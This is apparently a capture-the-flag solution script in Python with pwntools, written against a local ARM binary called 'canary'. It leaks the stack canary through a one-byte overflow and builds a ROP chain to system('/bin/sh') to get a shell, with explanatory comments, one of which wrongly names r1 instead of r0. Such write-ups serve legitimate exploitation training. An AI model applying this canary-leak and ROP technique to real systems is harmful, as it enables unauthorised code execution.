import pwn
import struct

# canary is a 32-bit statically-linked ARM executable
# NX is enabled, it has a canary, ASLR is turned on

# We can run it with: qemu-arm ./canary
# Can debug with:
# qemu-arm -g 12345 ./canary in one window
# gdb-multiarch -q -ex 'set architecture arm' -ex 'file canary' -ex 'target remote localhost:12345' in another window

# The executable is vulnerable to a basic buffer overflow
# We leak the canary by overwriting its lsb before a puts call
# libc_system and "/bin/sh" are statically compiled into the binary, so our rop is simply to call system('/bin/sh')

# 0x34 (52) is subtracted from stack pointer (sp)
# Buffer is 41 bytes
# Will read 0x60 (96) bytes into the 41 byte buffer
# The binary always stores our input in buffer + 1, so we are essentially writing to a 40 byte buffer

# In 32-bit arm, the return address is stored at the base of the stack
# Looking at the assembly in ghidra, we can see that the canary is stored at sp - 0x14 (Stack[-0x14...canary)
# So, after the 4-byte canary there are 0x10 (16) more bytes until the base of the stack
# The last 4 of those bytes are the return address
# This is what our stack looks like:

# [41 byte buffer] (we are always writing to buffer + 1)
# [4 byte canary]
# [12 other bytes]
# [4 byte return address]

# Sending 41 bytes will overflow just the least significant byte of the canary
# However, there is logic in the code so that if you send with a newline, the newline will be replaced with a null byte
# So we need to use pwn to send without newline

target = pwn.process(['qemu-arm', 'canary'])

############################
#### Leaking the Canary ####
############################

target.recvuntil(b'>')
target.send(b'a' * 41)
target.recvuntil(b'a' * 41)
canary = target.recv(3)

canary = b'\x00' * (4 - len(canary)) + canary
canary = struct.unpack("<I", canary)[0]

print(f"canary = {hex(canary)}")

#######################################
#### ROP Chain to system('bin/sh') ####
#######################################

# system is imported into the binary, we can find it with:
# arm-none-eabi-objdump -D canary | grep libc_system
# 00016d90 <__libc_system>:

libc_system = struct.pack("<I", 0x00016d90)

# Finding '/bin/sh'
# We can search for the string /bin/sh in Ghidra, and we will get 71eb0
# Or arm-none-eabi-strings -a -t x canary | grep /bin/sh will tell us 61eb0. IDK why there is a difference
# Ghidra is right, strings is wrong

bin_sh = struct.pack("<I", 0x71eb0)

# For our gadgets, we need to pop /bin/sh into r1, and then pop the address of libc_system into pc
# If we do ropper --file canary --search "pop" | grep r0 | grep pc
# We find:
# 0x00026b7c: pop {r0, r4, pc};
# We will just need 4 bytes of garbage to pop into r4

pop_gadget = struct.pack("<I", 0x00026b7c)

payload = b'a' * 40
payload += struct.pack("<I", canary)
payload += b'b' * 12
payload += pop_gadget
payload += bin_sh
payload += struct.pack("<I", 0x0) # garbage for r4
payload += libc_system

target.recvuntil(b'>')
target.send(payload)
target.recvuntil(b'>')
target.sendline(b'')
target.interactive()